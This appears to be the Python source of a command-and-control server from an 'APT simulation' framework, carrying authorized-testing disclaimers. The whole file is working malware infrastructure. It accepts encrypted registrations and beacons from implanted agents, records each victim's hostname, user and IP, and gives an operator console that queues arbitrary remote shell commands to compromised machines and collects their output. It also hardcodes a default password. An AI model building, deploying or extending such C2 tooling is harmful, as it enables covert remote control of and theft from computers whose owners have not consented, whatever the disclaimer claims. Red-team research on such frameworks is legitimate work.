"""
APT Framework - Command & Control Server
⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY

This C2 server is for educational and authorized testing purposes only.
Unauthorized use is illegal.
"""

import asyncio
import logging
from datetime import datetime
from typing import Dict, List
import json
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from aiohttp import web
from common.crypto import SecureComm
from common.protocol import Message, MessageType, Command, CommandType


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class Agent:
    """Represents a connected agent"""

    def __init__(self, agent_id: str, info: dict):
        self.agent_id = agent_id
        self.info = info
        self.registered_at = datetime.utcnow()
        self.last_seen = datetime.utcnow()
        self.pending_commands: List[Command] = []
        self.command_results: Dict[str, any] = {}

    def update_last_seen(self):
        """Update last seen timestamp"""
        self.last_seen = datetime.utcnow()

    def add_command(self, command: Command):
        """Add command to pending queue"""
        self.pending_commands.append(command)

    def get_pending_commands(self) -> List[Command]:
        """Get and clear pending commands"""
        commands = self.pending_commands.copy()
        self.pending_commands.clear()
        return commands


class C2Server:
    """Command & Control Server"""

    def __init__(self, host: str = "127.0.0.1", port: int = 8443, password: str = "C2Password123"):
        self.host = host
        self.port = port
        self.crypto = SecureComm(password)
        self.agents: Dict[str, Agent] = {}
        self.app = web.Application()
        self._setup_routes()

        logger.warning("=" * 60)
        logger.warning("⚠️  APT SIMULATION C2 SERVER")
        logger.warning("⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY")
        logger.warning("=" * 60)

    def _setup_routes(self):
        """Setup HTTP routes"""
        self.app.router.add_post('/beacon', self.handle_beacon)
        self.app.router.add_post('/register', self.handle_register)
        self.app.router.add_get('/health', self.handle_health)

    async def handle_health(self, request):
        """Health check endpoint"""
        return web.Response(text="OK")

    async def handle_register(self, request):
        """Handle agent registration"""
        try:
            encrypted_data = await request.read()
            decrypted_data = self.crypto.decrypt(encrypted_data)
            message = Message.from_bytes(decrypted_data)

            if message.msg_type != MessageType.REGISTER.value:
                return web.Response(status=400, text="Invalid message type")

            agent_id = message.agent_id
            agent_info = message.data

            # Register or update agent
            if agent_id not in self.agents:
                self.agents[agent_id] = Agent(agent_id, agent_info)
                logger.info(f"🆕 New agent registered: {agent_id}")
                logger.info(f"   Info: {json.dumps(agent_info, indent=2)}")
            else:
                self.agents[agent_id].update_last_seen()
                logger.info(f"♻️  Agent re-registered: {agent_id}")

            # Send response
            response_msg = Message(
                msg_type=MessageType.COMMAND,
                agent_id=agent_id,
                data={"status": "registered"}
            )
            encrypted_response = self.crypto.encrypt(response_msg.to_bytes())
            return web.Response(body=encrypted_response)

        except Exception as e:
            logger.error(f"Registration error: {e}")
            return web.Response(status=500, text=str(e))

    async def handle_beacon(self, request):
        """Handle agent beacon/heartbeat"""
        try:
            encrypted_data = await request.read()
            decrypted_data = self.crypto.decrypt(encrypted_data)
            message = Message.from_bytes(decrypted_data)

            agent_id = message.agent_id

            if agent_id not in self.agents:
                return web.Response(status=404, text="Agent not registered")

            agent = self.agents[agent_id]
            agent.update_last_seen()

            # Handle different message types
            if message.msg_type == MessageType.HEARTBEAT.value:
                logger.debug(f"💓 Heartbeat from {agent_id}")
            elif message.msg_type == MessageType.RESULT.value:
                logger.info(f"📥 Result from {agent_id}")
                logger.info(f"   Command ID: {message.command_id}")
                logger.info(f"   Result: {message.data}")
                agent.command_results[message.command_id] = message.data

            # Send pending commands
            pending_commands = agent.get_pending_commands()
            response_data = {
                "commands": [cmd.to_dict() for cmd in pending_commands]
            }

            response_msg = Message(
                msg_type=MessageType.COMMAND,
                agent_id=agent_id,
                data=response_data
            )
            encrypted_response = self.crypto.encrypt(response_msg.to_bytes())
            return web.Response(body=encrypted_response)

        except Exception as e:
            logger.error(f"Beacon error: {e}")
            return web.Response(status=500, text=str(e))

    def send_command(self, agent_id: str, cmd_type: str, params: dict = None):
        """Send command to agent"""
        if agent_id not in self.agents:
            logger.error(f"Agent {agent_id} not found")
            return False

        command = Command(cmd_type, params)
        self.agents[agent_id].add_command(command)
        logger.info(f"📤 Command queued for {agent_id}: {cmd_type}")
        return True

    def list_agents(self):
        """List all agents"""
        print("\n" + "=" * 80)
        print("CONNECTED AGENTS")
        print("=" * 80)
        for agent_id, agent in self.agents.items():
            print(f"\nAgent ID: {agent_id}")
            print(f"  Hostname: {agent.info.get('hostname', 'N/A')}")
            print(f"  OS: {agent.info.get('os', 'N/A')}")
            print(f"  User: {agent.info.get('user', 'N/A')}")
            print(f"  IP: {agent.info.get('ip', 'N/A')}")
            print(f"  Registered: {agent.registered_at}")
            print(f"  Last Seen: {agent.last_seen}")
        print("=" * 80 + "\n")

    async def interactive_console(self):
        """Interactive console for operator"""
        print("\n🎮 C2 Interactive Console")
        print("Commands: list, agents, use <agent_id>, shell <cmd>, help, exit\n")

        current_agent = None

        while True:
            try:
                if current_agent:
                    prompt = f"({current_agent})> "
                else:
                    prompt = "C2> "

                cmd = await asyncio.get_event_loop().run_in_executor(
                    None, input, prompt
                )
                cmd = cmd.strip()

                if not cmd:
                    continue

                parts = cmd.split(maxsplit=1)
                command = parts[0].lower()

                if command == "exit":
                    break
                elif command in ["list", "agents"]:
                    self.list_agents()
                elif command == "use":
                    if len(parts) < 2:
                        print("Usage: use <agent_id>")
                    else:
                        agent_id = parts[1]
                        if agent_id in self.agents:
                            current_agent = agent_id
                            print(f"Using agent: {agent_id}")
                        else:
                            print(f"Agent {agent_id} not found")
                elif command == "shell":
                    if not current_agent:
                        print("No agent selected. Use 'use <agent_id>' first")
                    elif len(parts) < 2:
                        print("Usage: shell <command>")
                    else:
                        shell_cmd = parts[1]
                        self.send_command(current_agent, CommandType.SHELL, {"cmd": shell_cmd})
                elif command == "sysinfo":
                    if not current_agent:
                        print("No agent selected. Use 'use <agent_id>' first")
                    else:
                        self.send_command(current_agent, CommandType.SYSINFO)
                elif command == "help":
                    print("\nAvailable commands:")
                    print("  list/agents     - List all connected agents")
                    print("  use <agent_id>  - Select an agent")
                    print("  shell <cmd>     - Execute shell command")
                    print("  sysinfo         - Get system information")
                    print("  exit            - Exit console\n")
                else:
                    print(f"Unknown command: {command}. Type 'help' for available commands.")

            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
            except Exception as e:
                logger.error(f"Console error: {e}")

    async def start(self):
        """Start C2 server"""
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()

        logger.info(f"🚀 C2 Server started on {self.host}:{self.port}")
        logger.info(f"🔑 Encryption key: {self.crypto.get_key().decode()}")

        # Start interactive console
        await self.interactive_console()


async def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(description="APT C2 Server")
    parser.add_argument("--host", default="127.0.0.1", help="Listen host")
    parser.add_argument("--port", type=int, default=8443, help="Listen port")
    parser.add_argument("--password", default="C2Password123", help="Encryption password")

    args = parser.parse_args()

    server = C2Server(args.host, args.port, args.password)
    await server.start()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("\n🛑 Server stopped")
